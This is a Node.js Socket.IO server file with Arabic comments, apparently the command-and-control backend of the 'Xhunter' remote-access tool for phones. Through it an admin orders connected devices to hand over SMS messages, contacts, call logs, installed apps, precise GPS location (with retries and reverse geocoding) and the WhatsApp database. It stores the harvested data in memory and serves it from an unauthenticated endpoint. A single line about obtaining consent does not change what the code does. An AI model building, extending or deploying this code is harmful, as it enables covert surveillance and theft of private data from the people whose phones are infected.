/* server.js — Xhunter backend (enhanced)
   Node 20+ (fetch builtin), express + socket.io
   - يجمع بيانات أفضل من العميل (IP, UA, screen, language)
   - يطلب الموقع بدقة (خيارات) ويدير retries/timeouts
   - reverse-geocode عبر Nominatim لتحسين العرض
   - pendingRequests لربط الردود بالطلبات من الـ Admin
   - endpoints: /api/devices, /api/logs
   IMPORTANT: تأكد من حصولك على موافقة المستخدم قبل جمع أي بيانات حساسة.
*/

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, {
  maxHttpBufferSize: 1e8,
  cors: { origin: "*", methods: ["GET","POST"], credentials: true }
});

const port = process.env.PORT || 8080;
server.listen(port, () => console.log(`[LOG] Server running on port ${port}`));

// In-memory stores (could be persisted to DB)
const devices = {};      // deviceId -> { id, model, ip, screen, language, socketId, lastSeen, lastLocation, ... }
const logs = [];         // array of { ts, level, msg }
const pendingRequests = {}; // deviceId -> action -> [{ id: reqId, resolve, reject, timer }]

// utility logging
function addLog(msg, level='info'){
  const entry = { ts: Date.now(), level, msg };
  logs.push(entry);
  console.log(`[${level.toUpperCase()}] ${new Date(entry.ts).toISOString()} - ${msg}`);
  // cap logs to reasonable size
  if(logs.length > 2000) logs.shift();
}

// helper: get remote IP (behind proxies)
function getRemoteIP(socket, payloadIp){
  // payloadIp: ip the client sent (via ipify). Prefer that if present.
  const forwarded = socket.handshake.headers['x-forwarded-for'];
  const sockAddr = socket.handshake.address;
  const via = forwarded ? forwarded.split(',')[0].trim() : null;
  return payloadIp || via || sockAddr || 'unknown';
}

// helper: uuid
function uuid(){
  return crypto.randomUUID ? crypto.randomUUID() : crypto.createHash('sha1').update(String(Math.random())).digest('hex');
}

// Reverse geocode (OpenStreetMap Nominatim) — polite usage, no heavy rate
async function reverseGeocode(lat, lon){
  try{
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
    const res = await fetch(url, { headers: { 'User-Agent': 'Xhunter/1.0 (contact@yourdomain.example)' } });
    if(!res.ok) return null;
    const j = await res.json();
    return j.display_name || null;
  }catch(e){
    return null;
  }
}

// pendingRequests management
function addPending(deviceId, action, timeoutMs = 10000){
  const reqId = uuid();
  if(!pendingRequests[deviceId]) pendingRequests[deviceId] = {};
  if(!pendingRequests[deviceId][action]) pendingRequests[deviceId][action] = [];
  let timer;
  const promise = new Promise((resolve, reject) => {
    timer = setTimeout(()=> {
      // timeout: remove this entry and reject
      const arr = pendingRequests[deviceId] && pendingRequests[deviceId][action];
      if(arr){
        const idx = arr.findIndex(x => x.id === reqId);
        if(idx !== -1) arr.splice(idx,1);
      }
      reject(new Error('timeout'));
    }, timeoutMs);
    pendingRequests[deviceId][action].push({ id: reqId, resolve, reject, timer });
  });
  return { reqId, promise };
}

function resolvePending(deviceId, action, payload){
  const arr = pendingRequests[deviceId] && pendingRequests[deviceId][action];
  if(arr && arr.length > 0){
    const item = arr.shift(); // FIFO — match oldest waiting request
    clearTimeout(item.timer);
    try{ item.resolve(payload); } catch(e){ /* ignore */ }
    return true;
  }
  return false;
}

// Express API (for quick debugging / admin)
app.get('/api/devices', (req,res) => {
  res.json({ ok:true, devices });
});
app.get('/api/logs', (req,res) => {
  res.json({ ok:true, logs: logs.slice(-500) });
});

// Socket.IO
io.on('connection', (socket) => {
  addLog(`Socket connected: ${socket.id}`);

  // Admin joins
  socket.on('adminJoin', () => {
    addLog(`Admin connected: ${socket.id}`);
    // send full devices snapshot
    Object.values(devices).forEach(d => socket.emit('join', d));
  });

  // Device joins
  socket.on('join', (devicePayload) => {
    try{
      const payload = devicePayload || {};
      const id = payload.id || ('device_' + Math.floor(Math.random()*10000));
      const remoteIp = getRemoteIP(socket, payload.ip);
      const now = Date.now();

      const enrich = {
        id,
        model: payload.model || payload.userAgent || payload.ua || 'unknown',
        ip: remoteIp,
        language: payload.language || payload.lang || null,
        screen: payload.screen || null,
        platform: payload.platform || null,
        cookiesEnabled: payload.cookiesEnabled !== undefined ? payload.cookiesEnabled : null,
        socketId: socket.id,
        lastSeen: now,
        lastJoinTs: now,
      };
      devices[id] = Object.assign(devices[id] || {}, enrich);
      addLog(`Device join: ${id} (${enrich.model}) IP:${enrich.ip}`);

      // notify admin(s)
      socket.broadcast.emit('join', devices[id]); // to other connected clients
      // also emit to all admins (we don't track admin ids separately here beyond clients listening to 'adminJoin')
      io.emit('join', devices[id]);
    } catch(e){
      addLog('Error on join: ' + e.message, 'error');
    }
  });

  // Admin requests -> forward to device with pending request support for some actions
  socket.on('request', async (d) => {
    // d might be JSON string or object
    let parsed = d;
    if(typeof d === 'string'){
      try{ parsed = JSON.parse(d); } catch(e){ parsed = d; }
    }
    const to = parsed.to;
    const action = parsed.action;
    const data = parsed.data || null;
    const options = parsed.options || {}; // optional: { timeout, retries, highAccuracy }
    addLog(`Admin request: ${action} -> ${to} (opts: ${JSON.stringify(options)})`);

    if(!to || !action){
      addLog('Invalid request from admin: missing to/action', 'warn');
      return;
    }
    const targetSocketId = devices[to] && devices[to].socketId;
    if(!targetSocketId){
      addLog(`Target device ${to} not connected`, 'warn');
      socket.emit('requestFailed', JSON.stringify({ to, action, reason: 'not_connected' }));
      return;
    }

    // Special handling for getLocation: use pendingRequests and retry logic
    if(action === 'getLocation'){
      // build options
      const timeoutMs = options.timeout || 12000;
      const retries = options.retries !== undefined ? options.retries : 2;
      const highAccuracy = options.highAccuracy === undefined ? true : !!options.highAccuracy;
      let attempt = 0;
      let lastErr = null;

      // inner attempt function
      async function attemptOnce(){
        attempt++;
        addLog(`Forwarding getLocation attempt ${attempt} -> ${to}`);
        // attach options in payload so client can use enableHighAccuracy
        io.to(targetSocketId).emit('getLocation', { requestId: uuid(), options: { highAccuracy } });
        try{
          const { promise } = addPending(to, 'getLocation', timeoutMs);
          const payload = await promise; // resolved when device replies or rejects on timeout
          addLog(`Location reply from ${to}: ${JSON.stringify(payload).slice(0,200)}`);
          // store into devices
          if(payload && payload.data && typeof payload.data.lat === 'number'){
            const lat = payload.data.lat, lon = payload.data.lon;
            devices[to].lastLocation = { lat, lon, ts: Date.now(), accuracy: payload.data.accuracy || null };
            // reverse-geocode (best-effort)
            try{
              const addr = await reverseGeocode(lat, lon);
              if(addr) devices[to].lastLocation.address = addr;
            }catch(e){ /* ignore */ }
            // notify admins
            io.emit('getLocation', { id: to, data: devices[to].lastLocation });
            return payload;
          } else {
            lastErr = new Error('invalid_payload');
            throw lastErr;
          }
        }catch(err){
          lastErr = err;
          addLog(`Attempt ${attempt} for ${to} failed: ${err && err.message ? err.message : err}`, 'warn');
          if(attempt <= retries){
            // small delay before retry
            await new Promise(r => setTimeout(r, 700));
            return attemptOnce();
          }
          throw lastErr;
        }
      }

      try{
        const result = await attemptOnce();
        socket.emit('requestResult', JSON.stringify({ to, action, ok: true, result }));
      }catch(err){
        addLog(`getLocation final failure for ${to}: ${err.message}`, 'error');
        socket.emit('requestResult', JSON.stringify({ to, action, ok: false, reason: err.message }));
      }
      return;
    }

    // For other actions: simply forward and optionally wait for a single response (short timeout)
    const waitForResponse = options.waitForResponse !== false; // default true
    io.to(targetSocketId).emit(action, data);
    addLog(`Emitted ${action} -> ${to} (socket ${targetSocketId})`);

    if(waitForResponse){
      try{
        const { promise } = addPending(to, action, options.timeout || 8000);
        const payload = await promise;
        // store payload to device record depending on action
        if(action === 'getInstalledApps') devices[to].installedApps = payload.data || payload;
        if(action === 'getContacts') devices[to].contacts = payload.data || payload;
        if(action === 'getCallLog') devices[to].callLog = payload.data || payload;
        if(action === 'getSMS') devices[to].sms = payload.data || payload;
        if(action === 'getExtraData') devices[to].extra = payload.data || payload;
        // forward to admin
        socket.emit('requestResult', JSON.stringify({ to, action, ok:true, result: payload }));
      }catch(err){
        addLog(`No response for ${action} from ${to}: ${err.message}`, 'warn');
        socket.emit('requestResult', JSON.stringify({ to, action, ok:false, reason: err.message }));
      }
    } else {
      socket.emit('requestResult', JSON.stringify({ to, action, ok:true, message:'sent' }));
    }
  });

  // generic device event handlers: when device emits events like getLocation, getContacts, etc.
  const deviceEvents = ['getLocation','getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
  deviceEvents.forEach(ev => {
    socket.on(ev, async (payload, callback) => {
      /* Payload expected shape:
         { id: deviceId, data: {...}, requestId?: '...' }  OR any shape client provides
      */
      try{
        // attempt to normalize
        let deviceId = payload && (payload.id || payload.ID || payload.deviceId) ? (payload.id || payload.ID || payload.deviceId) : null;
        let data = payload && payload.data !== undefined ? payload.data : payload;

        // if deviceId missing, attempt to find by socket.id
        if(!deviceId){
          for(const id in devices){
            if(devices[id].socketId === socket.id){
              deviceId = id;
              break;
            }
          }
        }

        if(!deviceId){
          addLog(`Received ${ev} but could not determine device id (socket ${socket.id})`, 'warn');
          return;
        }

        // update lastSeen
        devices[deviceId] = Object.assign(devices[deviceId] || {}, { socketId: socket.id, lastSeen: Date.now() });

        addLog(`Device event ${ev} from ${deviceId} payload: ${JSON.stringify(data).slice(0,200)}`);

        // store data in devices object
        switch(ev){
          case 'getInstalledApps':
            devices[deviceId].installedApps = data;
            break;
          case 'getContacts':
            devices[deviceId].contacts = data;
            break;
          case 'getCallLog':
            devices[deviceId].callLog = data;
            break;
          case 'getSMS':
            devices[deviceId].sms = data;
            break;
          case 'getExtraData':
            devices[deviceId].extra = data;
            break;
          case 'downloadWhatsappDatabase':
            devices[deviceId].whatsappDB = data; // potentially base64 string
            break;
          case 'getLocation':
            // data expected { lat, lon, accuracy? }
            if(data && typeof data.lat === 'number' && typeof data.lon === 'number'){
              devices[deviceId].lastLocation = { lat: data.lat, lon: data.lon, accuracy: data.accuracy || null, ts: Date.now() };
              // try reverse geocode in background (non-blocking)
              reverseGeocode(data.lat, data.lon).then(addr => {
                if(addr) {
                  devices[deviceId].lastLocation.address = addr;
                  // notify admins again with enriched info
                  io.emit('getLocation', { id: deviceId, data: devices[deviceId].lastLocation });
                }
              }).catch(()=>{});
            }
            break;
        }

        // If there was a pending request (admin waiting), resolve it
        const matched = resolvePending(deviceId, ev, { id: deviceId, data });
        if(!matched){
          // not matched but still forward to admin(s)
          io.emit(ev, { id: deviceId, data });
        } else {
          // matched and resolved; still forward to admin for logs/UI
          io.emit(ev, { id: deviceId, data });
        }

        // If device used callback style (client may pass callback), call it
        if(typeof callback === 'function'){
          try{ callback({ ok: true }); } catch(e){}
        }
      } catch(err){
        addLog(`Error handling device event ${ev}: ${err.message}`, 'error');
      }
    });
  });

  // handle disconnect
  socket.on('disconnect', (reason) => {
    addLog(`Socket disconnected ${socket.id} (${reason})`);
    // if it was a device, remove socketId and mark lastSeen
    for(const id in devices){
      if(devices[id].socketId === socket.id){
        devices[id].socketId = null;
        devices[id].lastSeen = Date.now();
        // broadcast to admins
        io.emit('disconnectClient', socket.id);
        addLog(`Device ${id} disconnected`);
      }
    }
  });

}); // end io.on(connection)
